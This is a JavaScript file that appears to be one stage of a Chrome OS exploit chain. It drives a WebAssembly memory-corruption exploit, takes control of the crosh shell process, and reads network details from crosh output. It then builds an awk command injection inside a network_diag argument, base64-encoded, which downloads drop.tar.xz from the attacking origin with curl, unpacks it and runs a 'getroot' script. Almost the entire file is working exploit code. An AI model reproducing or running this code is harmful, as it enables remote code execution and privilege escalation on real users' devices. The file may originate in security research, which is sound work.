run_wasm_exploit();

function log(msg) {
  signal_parent('log', {msg});
}

function log_drop(msg) {
  signal_parent('log_drop', {msg});
}


function signal_parent(cmd, data) {
  if (data === undefined)
    data = {};
  data.cmd = cmd;
  parent.postMessage(data, '*');
}

function recv_msg(e) {
  if (e.data.cmd == 'launch_crosh') {
    launch_crosh(function(success) {
      if (success) {
        log('in crosh process!');
        get_chronos(e.data.origin);
      } else {
        log('wrong process');
      }
      signal_parent('callback', {success: success});
    });
  } else if (e.data.cmd == 'crash') {
    write(mku64(0xdea), mku64(0xdbeef));
  }
}

function launch_crosh(cb) {
  log('launching crosh');
  run_sc('launch_crosh');
  function check_done() {
    var stat = read_sc('crosh_status').val();
    if (!stat) {
      setTimeout(check_done, 10);
    } else {
      var success = stat == 2;
      cb(success);
    }
  }
  check_done();
}

var crosh_out = '';
function get_crosh_output() {
  var ptr = run_sc('get_crosh_output');
  var sz = run_sc('get_crosh_output_size').val();
  crosh_out = read_str(ptr, sz).replace(/\r/g, '');
  var cut_start = '-- crosxpl cut here --\n';
  var cut_end = 'FAIL: Arp table does not contain';
  var start = crosh_out.indexOf(cut_start);
  if (start !== -1) {
    start += cut_start.length;
    var end = crosh_out.indexOf(cut_end, start);
    if (end === -1)
      end = undefined;
    log_drop(crosh_out.substring(start, end));
  }
  if (!end)
    setTimeout(get_crosh_output, 100);
}

function find_net() {
  var re = /wlan0.*\n.*inet *([^ ]*) *netmask *([^ ]*) *broadcast/;
  var match = re.exec(crosh_out);
  if (match === null)
    return null;
  var ip = match[1];
  var netmask = match[2];
  log('ip: ' + ip + ' netmask: ' + netmask);
  ip = ip.split('.');
  netmask = netmask.split('.');
  if (ip.length != 4 || netmask.length != 4)
    throw 'not ipv4?';
  var net = [];
  for (var i = 0; i < 4; i++)
    net.push(ip[i] & netmask[i]);
  return net;
}

function awk_injection(net, origin) {
  var cmd = 'exec 1>&2;';
  cmd += 'echo;echo "-- crosxpl cut here --";'
  cmd += 'echo "running as $(whoami)";';
  cmd += 'cd /home/chronos;';
  cmd += 'rm -rf drop.tar.xz drop;';
  cmd += 'curl -s ' + origin + '/drop.tar.xz > drop.tar.xz;';
  cmd += 'tar -vxJf drop.tar.xz;';
  cmd += 'bash drop/getroot;';
  var b64 = btoa(cmd);
  cmd = 'network_diag --route ';
  cmd += net[0] + '.' + net[1] + '.' + 'ip[3]=' + net[3] + ',' + net[2];
  cmd += '.)/{}BEGIN{system(sprintf("echo%c';
  cmd += b64;
  cmd += '|base64%c-d|sh",32,32))}# --no-log';
  return cmd;
}

function get_chronos(origin) {
  // we did get here by mistake, but don't panic
  run_sc('send_crosh_cmd', 'network_diag --interface\n');
  get_crosh_output();
  function get_net() {
    var net = find_net();
    if (net !== null) {
      var cmd = awk_injection(net, origin) + '\n';
      log('awk injection: ' + cmd);
      run_sc('send_crosh_cmd', cmd);
    } else {
      setTimeout(get_net, 100);
    }
  }
  get_net();
}

window.addEventListener('message', recv_msg, false);

window.onload = function() {
  p = document.createElement('p');
  p.innerText = 'crosher';
  document.body.appendChild(p);
  if (wasm_xpl_done)
    signal_parent('ready');
}
